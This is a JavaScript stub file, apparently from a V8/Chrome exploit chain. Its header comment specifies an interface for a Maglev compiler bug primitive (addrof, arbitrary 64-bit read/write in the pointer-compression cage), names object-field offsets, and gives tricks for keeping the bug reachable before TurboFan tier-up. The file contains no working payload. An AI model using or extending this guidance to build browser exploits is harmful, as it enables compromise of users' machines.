/* =====================================================================
 * storesink.js -- stage 1 PRIMARY.  DROP-IN POINT for the
 * maglev-store-sink primitive.
 *
 * Define:
 *
 *   window.PRIM_STORESINK = {
 *     // async, because the Maglev job is compiled on a background thread and
 *     // installed from the stack guard: the event loop must get a turn.
 *     arm: async function () {
 *       ...
 *       return {
 *         addrof:   function (obj)        { ... },  // optional but PREFERRED
 *         read64c:  function (cAddr)      { ... },  // BigInt
 *         write64c: function (cAddr, val) { ... }   // val is a BigInt
 *       };
 *     }
 *   };
 *
 * If addrof is returned too, the whole chain runs on ONE bug and the
 * smi-check victim never executes.  That is the configuration we want: it
 * removes a second tier-up window, a second feedback vector that has to stay
 * unmatured, and a second function competing for the concurrent compilation
 * queue.
 *
 * CONTRACT DETAILS
 *  - cAddr is a plain Number: a 32-bit COMPRESSED offset inside the 4 GB
 *    pointer-compression cage.  cageBase() gives the absolute base.
 *  - addrof returns a compressed address with the tag bit CLEARED.
 *  - read64c/write64c must tolerate addresses that are 4-byte but not 8-byte
 *    aligned: several V8 fields exploit.js touches sit at 4-aligned offsets
 *    (JSArrayBuffer byte_length +0x14, backing_store +0x24).  If the
 *    underlying OOB is 8-byte aligned, splice two reads / read-modify-write.
 *
 * TWO RULES LEARNED THE HARD WAY, BOTH OF WHICH SILENTLY DISABLE THE BUG
 *  1. Build victim arrays with TEMPLATE.slice() (or Array.from(TEMPLATE), or
 *     TEMPLATE.concat()).  An array literal or new Array(n)+push() shares an
 *     allocation site, and AllocationSite::DigestTransitionFeedback matures it
 *     to PACKED_DOUBLE after a few hundred calls; the literal then produces
 *     double arrays directly, no TransitionElementsKind node is emitted, and
 *     the pass has nothing to match.
 *  2. Never cache a compressed address across an allocation.  BigInt
 *     arithmetic allocates, an allocation can scavenge, and a scavenge moves
 *     young objects.  Re-derive from addrof() immediately before use.
 *
 * INVOCATION BUDGET
 *   invocation_count_for_maglev = 400, invocation_count_for_turbofan = 3000.
 *   Maglev cancels a finished job when TurboFan is already the active tier,
 *   and the stack guard processes INSTALL_CODE before INSTALL_MAGLEV_CODE,
 *   so once TurboFan installs the bug is gone.  Count invocations explicitly
 *   and stay under 3000 per victim function.
 * ===================================================================== */
if (typeof window.PRIM_STORESINK === "undefined") {
  window.PRIM_STORESINK = null;   // not loaded; primitive.js will say so
}
